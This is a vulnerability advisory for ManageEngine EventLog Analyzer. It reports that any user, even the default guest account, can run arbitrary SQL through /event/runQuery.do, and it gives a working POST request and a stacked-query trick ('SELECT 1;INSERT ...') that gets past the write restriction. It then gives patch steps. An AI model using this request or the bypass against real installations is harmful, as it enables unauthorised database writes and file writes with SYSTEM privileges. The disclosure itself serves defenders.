EventLog Analyzer carry out logs analysis for all Windows, Linux and Unix
systems, Switches and Routers (Cisco), other Syslog supporting devices, and
applications like IIS, MS SQL. Eventlog analyzer application is capable of
performing real-time log file analysis. Event log files analyzer
application can carry out log file analysis of imported files. The files
can be imported from the archive or from any machine.

event log file analyser application collects, performs log analysis and
displays the event on the EventLog Analyzer Dashboard, in real-time. The
event log report is generated from the analyzed event logs. From the event
log reports (graphs), you can drill down to the raw log events and do a
root cause analysis within minutes, and then focus on resolving it.

analyses to fulfill the requirements of forensic analysis and event log
audit. The forensic and audit reports can be generated from the analyzed
logs.


Vulnerability Details
---------------------

Every user has the ability to execute SQL queries through the
"/event/runQuery.do" script, including the default "guest" user. (The SQL
query option is just not visible in the web interface)
Below is the POST request, executed as "guest":

POST /event/runQuery.do HTTP/1.1
Host: 192.168.2.116:8400
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID=XXXXXXXXXX
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 39

execute=true&query=select+version%28%29


Access to queries starting with "INSERT" or "UPDATE" is denied by default,
however this can be bypassed by doing a select query first, like this:

"SELECT 1;INSERT INTO ..."

The included Postgres backend is running with SYSTEM privileges on Windows,
allowing to write files to disk with these privileges.

A Metasploit exploit module will be released shortly.


Solution
--------
ManageEngine has provided a patch to fix this issue, the steps to apply/fix
this are as below:

1. Stop the ELA service.
2. Download the zip from
http://bonitas2.zohocorp.com/zipUploads/2015_14_07_17_52_30_o_19q686iqs1sfemdf19e05sqre61.tar.gz
and extract the folders. You would have two folders "EventLogAnalyzerJSP"
and "LogAnalyzerClient"  under "o_19q686iqs1sfemdf19e05sqre61". Copy these
two folders and place it under <ELA Home>//lib/ folder.
3. The path of the following files would be as below:

runQuery_jsp.class --> <ELA
Home>\\lib\\EventLogAnalyzerJSP\\com\\adventnet\\sa\\jsp\\WEB_002dINF\\jsp
RunQuery.class --> <ELA Home>\\lib\\LogAnalyzerClient\\com\\adventnet\\la\
